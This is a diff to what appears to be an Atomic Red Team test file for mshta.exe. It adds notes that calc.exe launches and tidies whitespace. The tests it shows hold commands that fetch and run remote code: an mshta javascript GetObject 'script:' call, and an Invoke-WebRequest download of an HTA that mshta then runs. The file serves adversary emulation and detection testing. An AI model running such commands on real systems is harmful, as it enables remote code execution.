@@ -6,6 +6,7 @@ atomic_tests:
 - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
   description: |
     Test execution of a remote script using mshta.exe
+    Upon execution calc.exe will be launched
   supported_platforms:
     - windows
   input_arguments:
@@ -17,7 +18,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();      
+      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
 
 - name: Mshta calls a local VBScript file to launch notepad.exe
   description: Tests execution of a local program by a VBScript file called by Mshta
@@ -26,7 +27,7 @@ atomic_tests:
     - windows
 
   input_arguments:
-    local_file_path: 
+    local_file_path:
       description: Create a local VBScript file
       type: path
       default: C:\Temp\mshta_notepad.vbs
@@ -51,7 +52,7 @@ atomic_tests:
 - name: Mshta Executes Remote HTML Application (HTA)
   description: |
     Execute an arbitrary remote HTA.
-
+    Upon execution calc.exe will be launched
   supported_platforms:
     - windows
   input_arguments:
@@ -69,5 +70,5 @@ atomic_tests:
       $var =Invoke-WebRequest "#{hta_url}"
       $var.content|out-file "#{temp_file}"
       mshta "#{temp_file}"
-    cleanup_command: |  
+    cleanup_command: |
       remove-item "#{temp_file}" -ErrorAction Ignore
